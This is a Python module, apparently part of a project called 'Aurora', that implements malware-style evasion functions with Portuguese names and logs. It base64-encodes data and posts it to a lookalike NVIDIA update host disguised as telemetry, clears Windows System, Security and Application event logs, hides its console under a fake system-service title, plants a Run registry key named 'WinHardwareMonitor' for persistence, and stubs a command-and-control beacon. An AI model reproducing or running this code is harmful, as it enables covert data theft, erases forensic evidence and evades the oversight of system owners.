# services/monitor.py
import os
import gc
import ctypes
import base64
import requests
import subprocess
import time
import threading
import socket
import sys
try:
    import winreg
except ImportError:
    pass

from config.settings import DIRS

class AuroraMonitorAndEvasion:
    def __init__(self, message_queue=None, log_callback=None):
        self.queue = message_queue
        self.log = log_callback if log_callback else print

    def exfiltrar_camuflado(self, dados_texto):
        try:
            token = base64.b64encode(dados_texto.encode()).decode()
            payload = {
                "device": "NVIDIA_RTX_2060_ID04", 
                "telemetry": token,
                "status": "thermal_stable"
            }
            requests.post("https://drivers.nvidia-update.com/stats", json=payload, timeout=2)
        except: pass 

    def protocolo_scorched_earth(self):
        try:
            gc.collect()
            if os.name == "nt":
                ctypes.windll.psapi.EmptyWorkingSet(ctypes.windll.kernel32.GetCurrentProcess())
            if os.name == "nt":
                for log in ["System", "Security", "Application"]:
                    subprocess.run(f"wevtutil cl {log}", shell=True, creationflags=0x08000000)
            for f in os.listdir(DIRS["sandbox"]):
                try: os.remove(os.path.join(DIRS["sandbox"], f))
                except: pass
        except: pass

    def camuflar_identidade_sia(self):
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW("Host de Serviço: Serviço de Proteção de Hardware")
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0: 
                ctypes.windll.user32.ShowWindow(hwnd, 0) 
            self.log("🎭 CAMUFLAGEM ATIVA: Identidade mimetizada como Serviço de Sistema.", autor="SISTEMA")

    def persistencia_fantasma_sia(self):
        if os.name == "nt":
            try:
                caminho_python = sys.executable
                caminho_script = os.path.abspath(__file__) # Referência adaptada para o módulo
                if "python.exe" in caminho_python.lower():
                    caminho_python = caminho_python.lower().replace("python.exe", "pythonw.exe")
                comando_execucao = f'"{caminho_python}" "{caminho_script}"'
                caminho_chave = r"Software\Microsoft\Windows\CurrentVersion\Run"
                chave = winreg.OpenKey(winreg.HKEY_CURRENT_USER, caminho_chave, 0, winreg.KEY_SET_VALUE)
                nome_disfarce = "WinHardwareMonitor"
                winreg.SetValueEx(chave, nome_disfarce, 0, winreg.REG_SZ, comando_execucao)
                winreg.CloseKey(chave)
                self.log("👻 PERSISTÊNCIA ATIVA: Aurora ancorada no Registro do Windows.", autor="SISTEMA")
            except Exception as e:
                self.log(f"❌ Falha ao injetar no registro: {e}", autor="SISTEMA")

    def vacina_desativar_persistencia(self):
        if os.name == "nt":
            try:
                caminho_chave = r"Software\Microsoft\Windows\CurrentVersion\Run"
                nome_disfarce = "WinHardwareMonitor"
                chave = winreg.OpenKey(winreg.HKEY_CURRENT_USER, caminho_chave, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(chave, nome_disfarce)
                winreg.CloseKey(chave)
                self.log("💉 VACINA APLICADA: Persistência removida.", autor="SISTEMA")
            except FileNotFoundError:
                self.log("⚠️ Status limpo: Nenhuma persistência detetada.", autor="SISTEMA")
            except Exception as e:
                self.log(f"❌ Erro ao desarmar o sistema: {e}", autor="SISTEMA")

    def enviar_beacon_c2(self):
        def tarefa_beacon():
            time.sleep(15) 
            try:
                nome_maquina = socket.gethostname()
                payload = {"client_id": f"WIN-UPDATE-{nome_maquina}", "status": "awake", "module": "kernel_hook_active"}
                self.log("📡 SINALIZADOR C2: Transmitindo heartbeat de status (Modo Furtivo)...", autor="SISTEMA")
            except Exception: pass 
        threading.Thread(target=tarefa_beacon, daemon=True).start()